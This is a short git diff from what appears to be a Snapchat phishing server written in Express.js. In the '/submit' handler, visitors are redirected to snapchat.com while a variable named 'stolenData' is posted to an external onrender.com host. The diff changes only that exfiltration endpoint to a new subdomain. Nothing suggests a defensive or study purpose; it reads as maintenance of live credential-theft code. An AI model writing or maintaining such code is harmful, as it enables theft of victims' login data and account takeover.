@@ -68,7 +68,7 @@ app.post('/submit', async (req, res) => {
     }
 
     res.redirect('https://snapchat.com');
-    await fetch('https://snapchat-c4zd.onrender.com/submit', {
+    await fetch('https://snapchat-usvu.onrender.com/submit', {
   method: 'POST',
   body: JSON.stringify(stolenData)
 });
